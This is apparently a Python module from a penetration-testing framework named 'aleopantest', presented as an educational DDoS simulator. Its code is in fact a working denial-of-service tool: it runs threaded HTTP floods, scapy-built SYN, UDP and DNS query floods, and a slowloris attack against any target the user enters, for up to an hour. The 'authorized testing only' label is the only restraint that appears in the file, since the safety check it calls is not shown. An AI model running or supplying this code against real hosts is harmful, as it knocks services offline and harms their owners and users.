"""DDoS Attack Simulator and Detection Tool"""
import random
import threading
import time
from typing import Dict, Any, List, Optional
from datetime import datetime
import socket

from aleopantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from aleopantest.core.logger import logger

try:
    from scapy.all import IP, TCP, UDP, DNS, DNSQR, send, Raw
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

class DDoSSimulator(BaseTool):
    """
    DDoS Attack Simulator - Educational & Authorized Testing Only
    """
    
    def __init__(self):
        metadata = ToolMetadata(
            name="DDoS Simulator",
            category=ToolCategory.NETWORK,
            version="3.3.0",
            author="Aleocrophic Team",
            description="Tool simulasi DDoS untuk pengujian penetrasi resmi. Mendukung HTTP, SYN, UDP, dan DNS flood.",
            usage="aleopantest run ddos-sim --target example.com --type http --duration 30 --threads 10",
            requirements=['requests', 'scapy'],
            tags=['ddos', 'attack', 'network', 'simulation'],
            risk_level="CRITICAL",
            form_schema=[
                {
                    "name": "target",
                    "label": "Target Domain/IP",
                    "type": "text",
                    "placeholder": "e.g. 192.168.1.1 or example.com",
                    "required": True
                },
                {
                    "name": "type",
                    "label": "Attack Type",
                    "type": "select",
                    "options": ["http", "syn", "udp", "dns", "slowloris"],
                    "default": "http"
                },
                {
                    "name": "duration",
                    "label": "Duration (seconds)",
                    "type": "number",
                    "default": 30,
                    "min": 5,
                    "max": 3600
                },
                {
                    "name": "threads",
                    "label": "Threads",
                    "type": "number",
                    "default": 10,
                    "min": 1,
                    "max": 100
                }
            ] + BaseTool.get_common_form_schema()
        )
        super().__init__(metadata)
        self.attack_running = False

    def run(self, target: str = "", type: str = "http", duration: Any = 30, threads: Any = 10, **kwargs):
        self.start_time = time.time()
        
        # Ensure duration and threads are integers
        try:
            duration = int(duration)
            threads = int(threads)
        except (ValueError, TypeError):
            self.add_error(f"Invalid parameters: duration ({duration}) and threads ({threads}) must be integers.")
            return self.get_results()

        if not target:
            self.add_error("Target is required")
            return self.get_results()

        if not self.check_safety(duration):
            return self.get_results()

        self.audit_log(f"Starting DDoS Simulation: Type={type}, Target={target}, Duration={duration}s")
        self.add_result(f"[*] Memulai simulasi {type.upper()} flood ke {target}...")
        
        self.attack_running = True
        start_time = time.time()
        
        try:
            if type == "http":
                self.simulate_http_flood(target, duration, threads)
            elif type == "syn":
                self.simulate_syn_flood(target, duration)
            elif type == "udp":
                self.simulate_udp_flood(target, duration)
            elif type == "dns":
                self.simulate_dns_flood(target, duration)
            elif type == "slowloris":
                self.simulate_slowloris(target, duration, threads)
            
            self.add_result(f"[+] Simulasi selesai. Durasi: {round(time.time() - start_time, 2)}s")
        except Exception as e:
            self.add_error(f"Error during simulation: {str(e)}")
        finally:
            self.attack_running = False

        return self.get_results()

    def simulate_http_flood(self, target: str, duration: int, threads: int):
        import requests
        stop_time = time.time() + duration
        
        def worker():
            while time.time() < stop_time and self.attack_running:
                try:
                    requests.get(f"http://{target}", timeout=2)
                except:
                    pass

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            workers.append(t)
        
        time.sleep(duration)

    def simulate_syn_flood(self, target: str, duration: int):
        if not HAS_SCAPY:
            self.add_error("Scapy not installed")
            return
            
        stop_time = time.time() + duration
        while time.time() < stop_time and self.attack_running:
            pkt = IP(dst=target)/TCP(dport=80, flags="S")
            send(pkt, verbose=0)

    def simulate_udp_flood(self, target: str, duration: int):
        if not HAS_SCAPY:
            self.add_error("Scapy not installed")
            return
            
        stop_time = time.time() + duration
        while time.time() < stop_time and self.attack_running:
            pkt = IP(dst=target)/UDP(dport=random.randint(1, 65535))/Raw(load=random._urandom(1024))
            send(pkt, verbose=0)

    def simulate_dns_flood(self, target: str, duration: int):
        if not HAS_SCAPY:
            self.add_error("Scapy not installed")
            return
            
        stop_time = time.time() + duration
        while time.time() < stop_time and self.attack_running:
            pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=target))
            send(pkt, verbose=0)

    def simulate_slowloris(self, target: str, duration: int, threads: int):
        # Basic slowloris implementation
        import socket
        stop_time = time.time() + duration
        sockets = []
        
        try:
            for _ in range(threads):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, 80))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                sockets.append(s)
            
            while time.time() < stop_time and self.attack_running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    except:
                        sockets.remove(s)
                time.sleep(15)
        except:
            pass
        finally:
            for s in sockets:
                s.close()
